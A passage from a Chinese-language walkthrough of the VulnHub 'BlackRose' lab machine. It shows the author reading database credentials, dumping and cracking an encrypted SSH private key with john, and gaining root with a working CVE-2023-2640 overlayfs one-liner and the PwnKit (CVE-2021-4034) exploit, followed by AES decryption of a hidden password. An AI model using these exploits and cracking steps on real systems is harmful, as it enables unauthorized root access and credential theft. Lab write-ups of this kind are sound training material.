-rw-r--r--  1 root root 1.4K Nov 10  2019 database.php<br> 397308 -rw-r--r--  1 root root  303 Dec  1  2019 footer.php<br> 262152 -rw-r--r--  1 root root  364 Dec  1  2019 header.php<br> 924595 drwxrwxr-x  2 root root 4.0K Oct 22  2019 images<br> 397310 drwxrwxrwx  2 root root 4.0K Dec  5  2019 img<br> 262151 -rw-r--r--  1 root root 3.6K Nov 26  2019 index.php<br> 666484 drwxrwxr-x  2 root root 4.0K Nov 13  2019 js<br> 397363 -rw-rw-r--  1 root root 1.2K Nov 26  2019 login.php<br> 397364 -rw-r--r--  1 root root  198 Dec  1  2019 logout.php<br> 397309 -rw-rw-r--  1 root root 1.3K Dec  1  2019 register.php<br> 793409 drwxrwxr-x 20 root root 4.0K Oct 22  2019 vendors<br></code></pre></td></tr></table></figure><p>网站根目录中有 database.php 文件，其中包含数据库密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">define(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>define(<span class="hljs-string">&quot;pass&quot;</span>, <span class="hljs-string">&quot;howareyoubuddy&quot;</span>);<br>define(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;Dw&quot;</span>);<br>define(<span class="hljs-string">&quot;host&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br></code></pre></td></tr></table></figure><p>尝试用此密码切换登录，失败</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">ls</span> -alih<br>total 36K<br>1179652 drwxr-xr-x 6 delx delx 4.0K Dec  5  2019 .<br>1179649 drwxr-xr-x 4 root root 4.0K Nov  9  2019 ..<br>1183918 lrwxrwxrwx 1 delx delx    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>1179654 -rw-r--r-- 1 delx delx  220 Nov  7  2019 .bash_logout<br>1179655 -rw-r--r-- 1 delx delx 3.7K Dec  3  2019 .bashrc<br>1183761 drwx------ 2 delx delx 4.0K Nov  7  2019 .cache<br>1183759 drwx------ 3 delx delx 4.0K Nov  7  2019 .gnupg<br>1575430 drwxrwxr-x 3 delx delx 4.0K Dec  1  2019 .<span class="hljs-built_in">local</span><br>1179653 -rw-r--r-- 1 delx delx  807 Nov  7  2019 .profile<br>1183756 drwx------ 2 delx delx 4.0K Nov  7  2019 .ssh<br></code></pre></td></tr></table></figure><p>进入用户家目录中看到了 <code>.ssh</code> 文件，进入看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">ls</span> -alih<br>total 20K<br>1183756 drwx------ 2 delx delx 4.0K Nov  7  2019 .<br>1179652 drwxr-xr-x 6 delx delx 4.0K Dec  5  2019 ..<br>1183764 -rw-r--r-- 1 delx delx  390 Nov  7  2019 authorized_keys<br>1183757 -rw------- 1 delx delx 1.8K Nov  7  2019 id_rsa<br>1183758 -rw-r--r-- 1 delx delx  390 Nov  7  2019 id_rsa.pub<br><span class="hljs-built_in">cat</span> id_rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: AES-128-CBC,EC100EF5AB09B47D4E9774BD2A5263F7<br><br>66+ga/da/X5dODshv+050zni0avb5zvutVYj04tlApmncz+Yorcgu5EmWzFvKdZ9<br>PWsr69FOQ9OUDhYc7IQFHByETTh/lEGJbN/DiQhHuhaYTBysIs68TIELh5GJ+dL/<br>ZPTEywHi5kh7m5FrwPHoQjsxXdWycQWrknE4WJElDm7mkggZJTFga6rH9X2G51IE<br>AgGUPEIS976cYKW/+L82LvAiPsgRe/FDwxI325Pa6zdbnE3ITXNAKaSqdl0cHuUX<br>cZBq4x9D/YFT2ptvegsnqaTdl401GZQrxd67GwzOth8jn7wAzu9NsMQAbJzuW2mp<br>VbZEAIaWeOVaJyAQWAOKtYDVsFaBN5G2JpzLrQngN6VHc8AVBRBd5FlDsc+s/ROU<br>eaP2pt/jU9F3CqAO8ezkDm9H7olhJJ8f9HXWrsI/Rw/fZZbrxUmh3F8syLHpHd2r<br>/M/8ABMxYStpuRNo7dFNEvwY/lzdqlaRj5lDjvjKPQ14kJeGukKVY45oqP0FVeF4<br>VPP4B0mZtejvp9hpt5gX3sSdzfWWstYACSfilMlCQLDpsZylqYIPy19mLeEMZknu<br>G0CDxYdbFpxiTWE9tJhreODK282IDmGwwcxP/XMIKkP/qZD3HaCBYIYYWgnegqSd<br>rPRhWA67Fbl499+6Gt1uo/JVjcM8dcj+q4XaQg/cbXGDzaRFUAqbTkc4qiFHHoiG<br>4dOAGgQICJ6I4dF63R2CRi28ruD7X+2UMaaitkP/tqNyygPq5qpQOtTtoqBMyKD2<br>4oUSABGeNGHRusDUmmSUIgwxLjO9Oc0mHzzdsN/phoOO24I+NJepuaaW9R9SX3gL<br>/pDKiYqXc5XIoW9n1EvP/QeS6mbeDSLMExp72dp2sf53uZO77N+eBHgULQagkR7n<br>8cq7LHuR4N369t0hkff01J7G6oNnY/OIYANWSEzl9gB0XMp1LVGEPtSvxYAi2ifU<br>qmml6KE1IX+O3sZVzKPIm8YxMp2CbjjFloSHfWA+EYpmbq/4yUs92zRFfkmDr6v8<br>LWeJzYPMrAv9mtarqjqM12YjybBl4sinfLsuGsEjZifTz9YYGrcOea0pkEOap+ji<br>wB+sTtOjJzaQ6jGUJvnR7krGdYnHiGbgav3PqKzeOnYfNG1sqRyTY4lkYB5Y9+ta<br>3EwY5PzyjwYBrpDryvdL9ssV89CTAK4JURglrEAGRcbjs7Fg21pxXjNmYUbr2Aag<br>SlcwLYO3cDOpai4rXsOnGx/34KRgIGdWpgusQh1Z9HXD3hDbcsPbAISRfpc3pGVL<br>WMWuTqYJNQMW3TRvEqrHqyfPLuFRAUTWy+8yBlWYvjeQmihfJ9Xg2xtoEdQmQVa4<br>GDnH58J0zUmOowPRe/0TKyOMsfs1f20p96qo2eqR6bpHjkRCWMTx8CUTyS1CVo6X<br>gH8JeI1sbhffdLJY3rPPzLquuqRlLJFBWtfQe6tCGNpLLY3e7o8EUmYdIwEm6jrI<br>0NFosxoPtZJz2cw/m5jzPCH0wIu7yDLLvBwhkK4XpZa/gNIy+TGjCLonmbU9vd7f<br>/qyR/XhYI1i3lxBF4JGLL8FoEFCfasuZZVyjvwjlUbHliroTxKupWHvhYyPjKo7f<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>得到了 ssh 私钥，尝试使用此私钥 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ <span class="hljs-built_in">chmod</span> 400 id_rsa     <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh -i id_rsa delx@192.168.1.21<br>The authenticity of host <span class="hljs-string">&#x27;192.168.1.21 (192.168.1.21)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:wc/f/+tP1y7HbxIJA9NHM2yXxP+Hm+8B/vKQk5XAsT4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.1.21<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>id_rsa<span class="hljs-string">&#x27;:</span><br></code></pre></td></tr></table></figure><p>需要 passphrase，那就 john 上场</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh2john id_rsa &gt; sshhash<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo john sshhash --wordlist=/usr/share/wordlists/rockyou.txt                                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>doggiedog        (id_rsa)     <br>1g 0:00:00:00 DONE (2023-10-12 09:44) 11.11g/s 3454Kp/s 3454Kc/s 3454KC/s dolcegabanna..dodgers9<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>使用 <code>doggiedog</code> 作为私钥的口令来 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh -i id_rsa delx@192.168.1.21                              <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-69-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu Oct 12 13:44:22 UTC 2023<br><br>  System load:  0.0                Processes:             105<br>  Usage of /:   11.0% of 48.96GB   Users logged <span class="hljs-keyword">in</span>:       0<br>  Memory usage: 72%                IP address <span class="hljs-keyword">for</span> enp0s3: 192.168.1.21<br>  Swap usage:   0%<br><br><br>201 packages can be updated.<br>153 updates are security updates.<br><br><br>Last login: Thu Dec  5 21:57:42 2019 from 192.168.1.123<br></code></pre></td></tr></table></figure><p>尝试口令是否是此用户的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> delx: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> delx: <br>sudo: 1 incorrect password attempt<br></code></pre></td></tr></table></figure><p>并不是。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:~$ gcc --version<br>gcc (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0<br>Copyright (C) 2017 Free Software Foundation, Inc.<br>This is free software; see the <span class="hljs-built_in">source</span> <span class="hljs-keyword">for</span> copying conditions.  There is NO<br>warranty; not even <span class="hljs-keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure><p>有 gcc 啊，那可以尝试内核提权。接下来我使用 linpeas 进行了信息收集，查看了网站根目录、shadow 文件权限、用户家目录、一些特别的文件与压缩包。</p><p>唯一的收获是 <code>/usr/local/.../showPassword</code> 比较特殊，但是不知道怎么去提取有效信息，strings 命令看到了奇怪的字符，但是输入之后还是没成功。耐心-1,-1,-1</p><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>尝试内核提权，先尝试了一个比较新的 EXP：CVE-2023-2640，成功提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:/tmp$ unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;id&quot;)&#x27;</span><br>uid=0(root) gid=1002(delx) <span class="hljs-built_in">groups</span>=1002(delx)<br>delx@BlackRose:/tmp$ unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘l’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘u’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘w’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘m’: File exists<br>root@BlackRose:/tmp<span class="hljs-comment"># cd /root</span><br>root@BlackRose:/root<span class="hljs-comment"># ls -liah</span><br>total 36K<br>2097153 drwx------  6 root root 4.0K Jul 11  2020 .<br>      2 drwxr-xr-x 24 root root 4.0K Nov 13  2019 ..<br>2097158 lrwxrwxrwx  1 root root    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>2097154 -rw-r--r--  1 root root 3.1K Dec  3  2019 .bashrc<br>2097164 drwx------  2 root root 4.0K Dec  5  2019 .cache<br>2097162 drwx------  3 root root 4.0K Nov  7  2019 .gnupg<br>2097159 drwxr-xr-x  3 root root 4.0K Nov  7  2019 .<span class="hljs-built_in">local</span><br>2097155 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>2097168 -rw-r--r--  1 root root  511 Jul 11  2020 root.txt<br>2097156 drwx------  2 root root 4.0K Sep  7  2019 .ssh<br>root@BlackRose:/root<span class="hljs-comment"># cat root.txt </span><br>     _                   _                           _                   <br>    | | _____      _____| |   __      ____ _ ___    | |__   ___ _ __ ___ <br> _  | |/ _ \ \ /\ / / _ \ |   \ \ /\ / / _` / __|   | <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__/ _ \<br>| |_| |  __/\ V  V /  __/ |    \ V  V / (_| \__ \   | | | |  __/ | |  __/<br> \___/ \___| \_/\_/ \___|_|     \_/\_/ \__,_|___/   |_| |_|\___|_|  \___|<br>                                                                The box made by Jewel                               <br><br>7dcbcf000f38c8d2c0024011899ec84e<br><br>I thank you so much <span class="hljs-keyword">for</span> playing - Jewel 😀<br></code></pre></td></tr></table></figure><p>然后尝试了 linpeas 推荐的第一个 EXP——cve-2021-4034，成功提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:/tmp/CVE-2021-4034-main$ <span class="hljs-built_in">ls</span><br>cve-2021-4034.c  cve-2021-4034.sh  dry-run  LICENSE  Makefile  pwnkit.c  README.md<br>delx@BlackRose:/tmp/CVE-2021-4034-main$ make<br>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules<br><span class="hljs-built_in">mkdir</span> -p GCONV_PATH=.<br><span class="hljs-built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.<br>delx@BlackRose:/tmp/CVE-2021-4034-main$ <span class="hljs-built_in">ls</span><br> cve-2021-4034     cve-2021-4034.sh   gconv-modules   LICENSE    pwnkit.c    README.md<br> cve-2021-4034.c   dry-run           <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span>   Makefile   pwnkit.so<br> delx@BlackRose:/tmp/CVE-2021-4034-main$ ./cve-2021-4034<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(delx)<br></code></pre></td></tr></table></figure><h2 id="设计的攻击路径"><a href="#设计的攻击路径" class="headerlink" title="设计的攻击路径"></a>设计的攻击路径</h2><p>主要参考 <a href="https://mp.weixin.qq.com/s/9le2wTxnfkvUb6FMNMhDVA">BlackRose: 1-VulnHub (qq.com)</a></p><p>之前已经发现了 <code>/usr/local/.../showPassword</code> 文件，但是不知道如何处理，这里我们需要简单的逆向手段，拖进 IDA 里发现了一连串可能是用于判断的字符。<code>gqSFGqAJ</code></p><p><img src="/pic/611abcc4d23f236799c70524b45da926_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ./showPassword       <br>root@username:~<span class="hljs-comment"># gqSFGqAJ</span><br>Good luck buddy :)<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ./showPassword<br>root@username:~<span class="hljs-comment"># 123</span><br>person <span class="hljs-built_in">who</span> wrote me,he says it<span class="hljs-string">&#x27;s wrong 😀</span><br></code></pre></td></tr></table></figure><p><code>JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=</code> 看起来是加密&#x2F;编码后的字符串</p><blockquote><p>后边所用到的 AES 解密是需要去猜测的，一般有 key 的话就是对称加密算法，常见的对称加密算法有 DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES。<br>这个没什么捷径，只能尝试去一个一个猜解。<br>同时秘钥长度为8，转换成字节就是32位，通过这个信息缩小些范围。</p></blockquote><p>使用在线网站 <a href="https://aesencryption.net/">AES encryption</a> 进行解密</p><p><img src="/pic/4a6367546426370b0b6f6854a8abd16f_MD5.png"></p><p><code>RkZiPVkvxykJVOmxBmitBPeJXqFuxM</code> </p><p>我比较疑惑的一个点是 AES 中其实有额外的参数，比如：填充方式等，这个网站实际上没有显示出这些参数，那么如果我想真正自己去解析 AES，又该怎么做呢？</p><p>来自红队笔记解答的摘要：</p><blockquote><p>第一个问题：怎么判断出是 AES 加密的结果？<br>在本例中其实能想到 gqSFGqAJ 是 key 也不容易，因为需要有补全的想象力，是卡自己一段时间，四处突围地想和尝试才可能想到的。更多的是对加密算法使用习惯和频率的熟悉才能在思维上让你想到<br>第二个问题：如何使用 AES 解密？<br>简化思考的方式，aesencryption.net 这个站点现在也是可用的，也是如你看的 wp 能够解出明文密码的，靶机作者应该当初创建靶机就用这个站点生成的，然后因为 aesencryption.net 也比较通用，做这台靶机的用户网上一搜、一试也就通了<br>aes 加密加密涉及到诸多参数，而它都默认甚至忽略了。至少涉及这些问题：</p><ol><li>AES 密文和明文一般需要填充，用什么机制？</li><li>key 位数怎么确定，不足需要怎么填充？是有常用机制，但也不唯一。</li><li>最重要的，aesencryption.net 没有 iv 的选项，是都用了不用 iv 的 ECB 模式吗？<br>逆向了 aesencryption.net，对应上面问题的答案是：</li><li>用的 pkcs #7 。</li><li>key 要用0补足32个字节，256位。</li><li>用的 cbc，而且 iv 用的是12345678b0z2345n 这种很独特的、随机的值。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64  <br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES  <br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes</span>(<span class="hljs-params">string_from_passwordapp, key_text, iv_re_from_aesencryption</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;  </span><br><span class="hljs-string">    使用AES解密Base64编码的密文。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    参数:  </span><br><span class="hljs-string">    - string_from_passwordapp (str): 从密码应用程序获得的Base64编码的密文。  </span><br><span class="hljs-string">    - key_text (str): 用于AES的密钥。  </span><br><span class="hljs-string">    - iv_re_from_aesencryption (str): 从AES加密应用程序获得的初始化向量。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    返回:  </span><br><span class="hljs-string">    - str: 解密后的明文。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    异常:  </span><br><span class="hljs-string">    - ValueError: 解密失败或Base64解码失败。  </span><br><span class="hljs-string">    &quot;&quot;&quot;</span>  <br>     <br>    <span class="hljs-comment"># 确保密钥长度为32字节，适用于AES-256  </span><br>    key = key_text.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;\0&#x27;</span>).encode()  <br>    iv = iv_re_from_aesencryption.encode()  <br>  <br>    <span class="hljs-keyword">try</span>:  <br>        <span class="hljs-comment"># 解码从密码应用程序获得的Base64密文为原始的二进制格式  </span><br>        encrypted_data = base64.b64decode(string_from_passwordapp)  <br>         <br>        <span class="hljs-comment"># 使用AES进行解密  </span><br>        cipher = AES.new(key, AES.MODE_CBC, iv)  <br>        decrypted_text = cipher.decrypt(encrypted_data)  <br>  <br>        <span class="hljs-comment"># 使用PKCS7解填充  </span><br>        <span class="hljs-keyword">return</span> unpad(decrypted_text, AES.block_size, style=<span class="hljs-string">&#x27;pkcs7&#x27;</span>).decode()  <br>     <br>    <span class="hljs-keyword">except</span> (ValueError, AttributeError):  <br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;解密失败或Base64解码失败。&quot;</span>)  <br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:  <br>    <span class="hljs-comment"># 提供的数据  </span><br>    key_text = <span class="hljs-string">&quot;gqSFGqAJ&quot;</span>  <br>    iv_re_from_aesencryption = <span class="hljs-string">&quot;12345678b0z2345n&quot;</span>  <br>    string_from_passwordapp = <span class="hljs-string">&quot;JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=&quot;</span>  <br>  <br>    <span class="hljs-keyword">try</span>:  <br>        plain_text = decrypt_aes(string_from_passwordapp, key_text, iv_re_from_aesencryption)  <br>        <span class="hljs-built_in">print</span>(plain_text)  <br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:  <br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>可能出现的问题和解答：</p><p><img src="/pic/7699795bd41e0f3ef8c87c7f75e9ac0a_MD5.png"></p><p>在上述知识的基础上，<code>gqSFGqAJ000000000000000000000000</code> 作为 utf8 格式的 key 输入，还是失败了。因此我先是尝试添加了一层 Hex，确认了 base64 解码结果没问题，同时指定 AES Decrypt 的输入为 hex，这样就可以确认是 AES Decrypt 层出了问题，而可控参数实际上就只有 Key 和 IV，又经过不断的尝试，我得到了以下成功的结果</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-name">https://gchq.github.io/CyberChef/</span>#recipe=From_Base64(<span class="hljs-symbol">&#x27;A-Za-z0-9%2B/%3D</span>](<span class="hljs-name">https://gchq.github.io/CyberChef/</span>#recipe=From_Base64(<span class="hljs-symbol">&#x27;A-Za-z0-9%2B/%3D</span>)&#x27;,true,false)AES_Decrypt(<span class="hljs-name">%7B</span><span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;677153464771414a000000000000000000000000000000000000000000000000</span><span class="hljs-symbol">&#x27;%7D</span>,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;UTF8</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;12345678b0z2345n</span><span class="hljs-symbol">&#x27;%7D</span>,<span class="hljs-symbol">&#x27;CBC</span>&#x27;,<span class="hljs-symbol">&#x27;Raw</span>&#x27;,<span class="hljs-symbol">&#x27;Raw</span>&#x27;,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span>&#x27;<span class="hljs-symbol">&#x27;%7D</span>,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span>&#x27;<span class="hljs-symbol">&#x27;%7D</span>)&amp;input=SnFULzN0L3VjWUx3L2RsYjZjNVB6bVFNOWxSWWp1UklQZ0NtY0hQK1JURT0<br></code></pre></td></tr></table></figure><p>将 key 的值由 UTF8的 <code>gqSFGqAJ000000000000000000000000</code> 更改为 hex 的 <code>677153464771414a000000000000000000000000000000000000000000000000</code> 就能成功，又翻查了一些资料，我判断是当输入 